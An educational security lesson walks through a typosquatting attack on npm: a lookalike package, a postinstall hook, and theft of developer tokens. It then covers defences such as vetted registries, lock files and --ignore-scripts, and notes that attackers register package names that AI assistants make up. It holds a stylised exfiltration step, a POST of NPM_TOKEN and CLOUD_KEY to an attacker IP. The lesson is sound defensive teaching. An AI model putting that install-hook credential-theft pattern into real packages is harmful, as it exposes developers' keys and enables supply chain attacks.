# Dangerous dependencies and typosquatting

`lesson` H6 · `section` H · `wave` 3 · `format` 1

## Passport

- `cwe` 829
- `owasp` A06:2021, A08:2021
- `attack` T1195.001
- `severity` high
- `impact` The attacker's code runs on a developer's computer and carries off their keys and tokens
- `defence` A vetted internal registry and a lock file
- `class` Dependency substitution

## Sources

- [MITRE ATT&CK T1195.001: Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/)
- [OWASP Top 10:2021 A06: Vulnerable and Outdated Components](https://owasp.org/Top10/2021/A06_2021-Vulnerable_and_Outdated_Components/)
- [OWASP Top 10:2021 A08: Software and Data Integrity Failures](https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/)
- [OWASP Cheat Sheet Series: NPM Security](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)
- [MITRE CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)

## Participants

- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`
- `registry` **Registry** — registry.example · `icon:server` · `term:package-registry`
- `mirror` **Own registry** — packages.corp.example · `icon:server`
- `dev` **Developer** — 192.0.2.30 · `icon:workstation` · `term:victim`

## Zones

- `internet` Internet: `attacker`, `registry`
- `company` Company: `mirror`, `dev`

## Steps

### `publish` A package with a lookalike name

`attacker → registry` · `attack` · `icon:document`
Message: fake · Result: published

```json
{
  "name": "⟦acme-example-utlis⟧",
  "scripts": { "postinstall": "⟦node collect.js⟧" }
}
```

#### Simple

There is a popular library called `acme-example-utils`. The attacker publishes a package named
`acme-example-utlis` in the public registry: two letters swapped. It looks like an ordinary library, with
harmful code inside.

#### Step by step

Any registered user can publish a package in the public registry. The attacker picks a name that
is easy to type by mistake and copies the real package's description.

#### Deeper

This trick is called **typosquatting**. MITRE ATT&CK mentions it in sub-technique T1195.001,
Compromise Software Dependencies and Development Tools, alongside tampering with popular open
source packages and re-registering abandoned ones. The OWASP npm cheat sheet also describes a
newer variant: package names an AI assistant makes up, which the attacker registers in advance.

### `typo` The developer's typo

`dev → mirror` · `legit`
Message: typo · Result: request sent

```text
$ npm install ⟦acme-example-utlis⟧
```

#### Simple

The developer wants to add `acme-example-utils` to the project, but is in a hurry and types the name with
a typo. The command does not complain: a package with that name exists.

#### Step by step

The request goes to the company's internal registry, which asks the public registry if it does
not have the package itself. To the tool this is an ordinary install of a new **dependency**.

#### Deeper

A dependency is someone else's code that your project relies on. A modern project has hundreds of
them, each with dependencies of its own. OWASP A06:2021 starts its list of warning signs with not
knowing the versions of all components you use, nested dependencies included.

### `deliver` The registry hands over the fake

`registry → mirror` · `attack` · `without-defence`
Message: fake · Result: passed through

#### Simple

The internal registry works as a plain go-between: whatever comes from the public registry, it
hands on. The fake package goes through without questions.

#### Step by step

The go-between speeds up installs and caches packages, but it does not decide which packages to
trust. Any name from the public registry is as good to it as the real one.

#### Deeper

A related attack is dependency confusion. The attacker learns the name of a company's internal
package, for example from a leaked project file or a job posting, and publishes a package with the
same name and a higher version number in the public registry. If the tool looks in both places, it
may pick the public "newer" one. OWASP advises a company scope (`@acme/…`) tied to your own
registry, and placeholder packages with the same names in the public registry.

### `install` The install script

`mirror → dev` · `attack` · `without-defence`
Message: fake · Result: script runs

```text
> acme-example-utlis 1.0.0, postinstall
> ⟦node collect.js⟧
```

#### Simple

The package installs, and its **install script** runs straight away. The developer has not
written a single line using the new library, yet its code is already running on their computer.

#### Step by step

npm packages can declare scripts that run at install time. They run with the developer's rights:
they see the developer's files, environment variables and network.

#### Deeper

The OWASP npm cheat sheet advises not running install scripts by default: the `--ignore-scripts`
flag or the line `ignore-scripts=true` in `.npmrc`, with an allowlist for the packages that need
them. The flag only stops install scripts: the library's own code will run as soon as the
project calls it.

### `steal` Tokens go to the attacker

`dev → attacker` · `attack` · `without-defence`
Message: tokens and keys · Result: stolen

```text
POST https://203.0.113.66/c
⟦NPM_TOKEN=…  CLOUD_KEY=…⟧
```

#### Simple

The script collects the developer's **secrets**, tokens and access keys, and sends them to the
attacker. Now the attacker can act as the developer.

#### Step by step

Any package can read environment variables, and that is often where publishing tokens and cloud
keys live. With a publishing token the attacker can release a harmful version of a real library.

#### Deeper

The OWASP cheat sheet notes that any package can read environment variables through
`process.env`, which makes credentials a common target. It recommends short-lived tokens with
minimal rights, read-only access for installing, and a second factor for publishing. A stolen
token turns an attack on one developer into a supply chain attack.

### `vet` The package is not on the vetted list

`registry → mirror` · `attack` · `with-defence` · `stopped`
Message: fake · Result: stopped

```text
acme-example-utlis   ⟦not on the approved list⟧ → refused
acme-example-utils   approved, version 3.2.0
```

#### Simple

Now the company's own registry serves only packages the company has checked and approved.
`acme-example-utlis` is not on that list, so it never reaches the developer.

#### Step by step

A new dependency gets onto the list only after a check: who the author is, how old the package is,
how many people use it, what its install scripts do. A misspelt name will not get through.

#### Deeper

OWASP A08:2021 advises taking libraries only from trusted repositories and, for a higher risk
profile, hosting your own vetted repository. A06:2021 adds: obtain components only from official
sources over secure links, prefer signed packages, and remove unused dependencies.

### `right` Installing with a lock file

`mirror → dev` · `safe` · `with-defence`
Message: real one · Result: installed

```text
$ npm install acme-example-utils --ignore-scripts
acme-example-utils 3.2.0  recorded in package-lock.json
```

#### Simple

The developer sees the refusal, spots the typo and installs the real package. Its exact version is
recorded in the **lock file**, so everyone on the team gets exactly that package.

#### Step by step

The lock file holds the exact versions of all dependencies, nested ones included. Colleagues and
the build server install them with `npm ci`, strictly from it, with install scripts turned off.

#### Deeper

The OWASP npm cheat sheet advises committing the lock file and installing with `npm ci`: any
inconsistency with the lock file aborts the install. A lock file does not protect against a typo
in a new dependency, but it stops an already vetted one from being swapped quietly.

## How to defend

- **A vetted internal registry.** Developers and builds install packages only from an internal
  registry with an approved list, not straight from the public one.
- **A lock file and `npm ci`.** Exact versions of all dependencies in the repository; the install
  aborts on any mismatch.
- **Do not run install scripts by default.** Use `--ignore-scripts`, with an allowlist for the
  packages that need them.
- **Check the name before installing.** The package's author, age and popularity; especially for
  names an AI assistant suggested.
- **A scope for your own packages**, tied to your own registry, against dependency confusion.
- **Few secrets on developer machines.** Short-lived tokens with narrow rights, a second factor
  for publishing.
- **Inventory and update dependencies.** Know what is in the project, remove what is unused,
  watch for vulnerabilities in the components you use.
